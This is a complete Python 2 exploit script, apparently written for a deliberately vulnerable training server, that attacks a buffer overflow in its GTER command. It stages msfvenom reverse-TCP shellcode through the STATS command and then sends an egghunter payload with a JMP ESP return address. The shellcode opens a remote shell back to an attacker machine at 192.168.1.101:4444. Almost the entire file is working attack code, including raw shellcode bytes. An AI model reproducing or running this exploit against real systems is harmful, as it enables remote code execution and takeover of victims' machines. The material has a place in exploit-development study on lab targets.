#!/usr/bin/python

import os
import sys
import socket

# JMP ESP: 625011AF 
# Short Jump back 50 bytes: \xEB\xCE

# msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
shellcode = (
"W00TW00T"
"\xb8\x5d\x88\x7a\x63\xda\xc8\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\x9e\x8c\x98\x96\xdc\x65\xde"
"\x59\x1c\x76\xbf\xd0\xf9\x47\xff\x87\x8a\xf8\xcf\xcc\xde\xf4"
"\xa4\x81\xca\x8f\xc9\x0d\xfd\x38\x67\x68\x30\xb8\xd4\x48\x53"
"\x3a\x27\x9d\xb3\x03\xe8\xd0\xb2\x44\x15\x18\xe6\x1d\x51\x8f"
"\x16\x29\x2f\x0c\x9d\x61\xa1\x14\x42\x31\xc0\x35\xd5\x49\x9b"
"\x95\xd4\x9e\x97\x9f\xce\xc3\x92\x56\x65\x37\x68\x69\xaf\x09"
"\x91\xc6\x8e\xa5\x60\x16\xd7\x02\x9b\x6d\x21\x71\x26\x76\xf6"
"\x0b\xfc\xf3\xec\xac\x77\xa3\xc8\x4d\x5b\x32\x9b\x42\x10\x30"
"\xc3\x46\xa7\x95\x78\x72\x2c\x18\xae\xf2\x76\x3f\x6a\x5e\x2c"
"\x5e\x2b\x3a\x83\x5f\x2b\xe5\x7c\xfa\x20\x08\x68\x77\x6b\x45"
"\x5d\xba\x93\x95\xc9\xcd\xe0\xa7\x56\x66\x6e\x84\x1f\xa0\x69"
"\xeb\x35\x14\xe5\x12\xb6\x65\x2c\xd1\xe2\x35\x46\xf0\x8a\xdd"
"\x96\xfd\x5e\x71\xc6\x51\x31\x32\xb6\x11\xe1\xda\xdc\x9d\xde"
"\xfb\xdf\x77\x77\x91\x1a\x10\xb8\xce\x25\x85\x50\x0d\x25\x54"
"\xfd\x98\xc3\x3c\xed\xcc\x5c\xa9\x94\x54\x16\x48\x58\x43\x53"
"\x4a\xd2\x60\xa4\x05\x13\x0c\xb6\xf2\xd3\x5b\xe4\x55\xeb\x71"
"\x80\x3a\x7e\x1e\x50\x34\x63\x89\x07\x11\x55\xc0\xcd\x8f\xcc"
"\x7a\xf3\x4d\x88\x45\xb7\x89\x69\x4b\x36\x5f\xd5\x6f\x28\x99"
"\xd6\x2b\x1c\x75\x81\xe5\xca\x33\x7b\x44\xa4\xed\xd0\x0e\x20"
"\x6b\x1b\x91\x36\x74\x76\x67\xd6\xc5\x2f\x3e\xe9\xea\xa7\xb6"
"\x92\x16\x58\x38\x49\x93\x78\xdb\x5b\xee\x10\x42\x0e\x53\x7d"
"\x75\xe5\x90\x78\xf6\x0f\x69\x7f\xe6\x7a\x6c\x3b\xa0\x97\x1c"
"\x54\x45\x97\xb3\x55\x4c")

# 32 bit egghunter shellcode
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
"\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")

payload = ''
payload += 'A' * 36
payload += egghunter 
payload += 'A' * (147-len(payload)) 
payload += '\xAF\x11\x50\x62' #JMP ESP in essfunc.dll
payload += '\xEB\x8B\xff\xff'
payload += 'C' * (5000 - len(payload))

# Send the 2nd stage shellcode to the STATS command
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect.connect(('192.168.1.102',9999))
print connect.recv(1024)
connect.send('STATS ' + shellcode + '\r\n')
connect.recv(1024)
connect.close()

# Send the 1st stage payload to the GTER command
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect.connect(('192.168.1.102',9999))
print connect.recv(1024)
connect.send('GTER /.:/' + payload + '\r\n')
connect.recv(1024)
connect.close()